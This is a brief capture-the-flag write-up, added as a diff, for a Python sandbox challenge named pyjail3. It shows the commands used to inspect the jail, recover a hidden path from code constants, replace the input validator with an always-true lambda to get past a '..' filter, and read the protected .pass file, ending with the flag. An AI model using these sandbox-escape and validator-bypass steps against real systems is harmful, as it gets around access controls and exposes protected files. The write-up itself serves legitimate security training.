@@ -1,0 +1,32 @@
+Get available commands 'print(dir())':
+	['__builtins__', 'shell']
+
+Get shell object infos 'print(dir('shell'))':
+	['__doc__', '__module__', '_validateUserInput', 'cat', 'help', 'hint', 'ls']
+
+shell.help() :
+	This script run as pyjail3.
+  	Find a way to print this file /home/pyjail3/.pass
+
+shell.hint() :
+	Dig a little more here: http://docs.python.org/2/reference/datamodel.html
+
+
+Again we can get the path from print(shell.help.im_func.func_code.co_consts[3][32:])
+	/home/pyjail3/.pass
+
+When we try 
+shell.cat(shell.help.im_func.func_code.co_consts[3][46] + shell.help.im_func.func_code.co_consts[3][46] + shell.help.im_func.func_code.co_consts[3][45:])
+
+We get an error since ".." is sanitized.. Need to find another way to get to the file
+
+Let's see if we can modify shell._validateUserInput
+
+That was actually pretty simple
+shell._validateUserInput = lambda x: True
+
+Then we execute same code :
+shell.cat(shell.help.im_func.func_code.co_consts[3][46] + shell.help.im_func.func_code.co_consts[3][46] + shell.help.im_func.func_code.co_consts[3][45:])
+
+Which give the flag : 
+PBo2knSV1EFysXlcuzQp
